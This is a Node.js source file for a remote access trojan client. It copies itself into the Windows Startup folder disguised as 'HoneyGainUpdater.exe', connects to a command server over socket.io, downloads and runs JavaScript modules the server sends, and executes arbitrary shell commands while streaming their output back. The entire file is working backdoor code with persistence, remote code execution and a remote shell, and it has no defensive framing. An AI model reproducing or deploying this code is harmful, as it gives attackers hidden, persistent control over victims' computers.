//ar Service = require('node-windows').Service;
const path = require("path");
const childProcess = require("child_process");
const fs = require('fs');
const request = require('request-promise')
const os = require('os')
const io = require('socket.io-client');
const dns = 'http://localhost:3000'
const socket = io(dns);


const startPath = path.join(os.homedir(), '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HoneyGainUpdater.exe')

childProcess.exec(`copy  "${ process.pkg ? process.execPath : __filename }" "${startPath}" `, function (err, stdout) {
    console.log(err);
    console.log(stdout)
})

socket.on('connect', () => {
    console.log('connected');
});

socket.on('execute', (data) => {
    request(dns + '/' + data.module).then((response) => {
        fs.writeFile('command.js', response, (err) => console.log(err))
        var cp = childProcess.fork(path.join(process.pkg ? path.dirname(process.execPath) : __dirname, 'command.js'), [], { silent: true })
        cp.on("exit", () => socket.emit('exit', { module : 'command' }));
        cp.stdout.on("data", (data) =>  socket.emit('message', { data : data.toString('utf8') }));
        cp.on("error", (err) => socket.emit('error', { error : err }));
    }).catch((error) => console.log(error))
});

socket.on('cmd', (data) => {
    var cp = childProcess.exec(data.command)
    cp.on("exit", () =>  socket.emit('exit', { module : 'command' }));
    cp.stdout.on("data", (data) =>  socket.emit('message', { data : data }));
    cp.on("error", (err) =>  socket.emit('error', { error: err }));
});

socket.on('disconnect', () => {
    console.log('disconnected');
});